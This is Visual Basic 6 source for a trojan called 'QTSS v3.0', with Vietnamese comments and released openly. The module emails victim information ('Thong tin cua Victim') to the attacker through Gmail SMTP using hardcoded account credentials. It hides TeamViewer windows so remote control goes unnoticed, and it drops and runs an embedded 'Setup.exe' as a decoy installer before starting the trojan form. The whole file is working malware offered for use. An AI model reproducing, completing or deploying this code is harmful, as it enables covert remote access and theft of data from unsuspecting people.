Attribute VB_Name = "Module1"
'====================================
'= Author: trungtrung (dinhquangtrung90@yahoo.com)
'= QTSS v3.0 - Open Source
'= Don't Forget Me When You Use This Program :) Thank
'====================================
'
'
'
'((((((( Mudule chính cua chuong trình, module duy nhâ't mình tu viê't trong chuong trình này :))       )))))))))


Declare Function GetDesktopWindow Lib "user32" () As Long
Declare Function EnumChildWindows Lib "user32" (ByVal hWndParent As Long, ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hWnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Private Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Private Declare Function DeleteFile Lib "Kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
Private Declare Function InternetGetConnectedStateEx Lib "wininet.dll" (ByRef lpdwFlags As Long, ByVal lpszConnectionName As String, ByVal dwNameLen As Integer, ByVal dwReserved As Long) As Long
Dim sConnType As String * 255
Const SW_HIDE = 0
Public Function SendMail(xEmail, xNoiDung)
'Gui mail
Dim Flds
Dim iMsg As New CDO.Message
Dim iConf As New CDO.Configuration
Set Flds = iConf.Fields

schema = "http://schemas.microsoft.com/cdo/configuration/"
Flds.Item(schema & "sendusing") = 2
Flds.Item(schema & "smtpserver") = "smtp.gmail.com"
Flds.Item(schema & "smtpserverport") = 465
Flds.Item(schema & "smtpauthenticate") = 1
Flds.Item(schema & "sendusername") = "Virus.TV.123"
Flds.Item(schema & "sendpassword") = "881817258"
Flds.Item(schema & "smtpusessl") = 1
Flds.Update
 
With iMsg
.To = xEmail
.CC = ""
.BCC = ""
.From = "<Virus.TV.123>"
.Subject = "Thong tin cua Victim"
.HTMLBody = xNoiDung
.TextBody = xNoiDung
.Sender = "<Virus.TV.123>"
.Organization = "<Virus.TV.123>"
.ReplyTo = "Virus.TV.123@gmail.com"
Set .Configuration = iConf
.Send
End With
 
Set iMsg = Nothing
Set iConf = Nothing
Set Flds = Nothing
End Function


Public Function EnumChildProc(ByVal hWnd As Long, ByVal lParam As Long) As Long
'(((( Lâ'y các Handle có trên Desktop
On Error Resume Next
    Dim sSave As String
    sSave = Space$(GetWindowTextLength(hWnd) + 1)
    GetWindowText hWnd, sSave, Len(sSave)
    sSave = Left$(sSave, Len(sSave) - 1)
    If UCase(GetExeFromHandle(hWnd)) = "TEAMVIEWER.EXE" Then
        ShowWindow hWnd, SW_HIDE
    End If
    EnumChildProc = 1
End Function

Public Function GetClsName(hWnd As Long) As String
'((((( Lâ'y Classname thông qua handle
  Dim lpClassName As String, RetVal As Long
  lpClassName = Space(256)
  RetVal = GetClassName(hWnd, lpClassName, 256)
  lpClassName = Left$(lpClassName, RetVal)
  GetClsName = lpClassName
End Function

Public Function AppPath()
AppPath = App.Path
If Right(AppPath, 1) <> "\" Then AppPath = AppPath & "\"
End Function

Sub Main()

' Nê'u không kê't nô'i Internet thì thoát
Dim Ret As Long
Ret = InternetGetConnectedStateEx(Ret, sConnType, 254, 0)
If Ret <> 1 Then
    End
End If



'((((((((((( Extract file Setup Unlocker & Run it )))))))))
If UCase(AppPath) <> "C:\WINDOWS\SYSTEM32\" Then
    Dim ocxDir$
    ocxDir = "C:\WINDOWS\Setup.exe"
    If (FileExists("C:\WINDOWS\Setup.exe") = True) Then
        SetAttr "C:\WINDOWS\Setup.exe", vbNormal
        DeleteFile "C:\WINDOWS\Setup.exe"
    End If
    Dim bytResourceData() As Byte
    bytResourceData = LoadResData(102, "CUSTOM")
    Open ocxDir For Binary Shared As #1
    Put #1, 1, bytResourceData
    Close #1
    Shell "C:\WINDOWS\Setup.exe", vbNormalFocus
End If

'chay trojan
Load Form1
End Sub
Public Function FileExists(sFile As String) As Boolean
On Error Resume Next
FileExists = ((GetAttr(sFile) And vbDirectory) = 0)
End Function

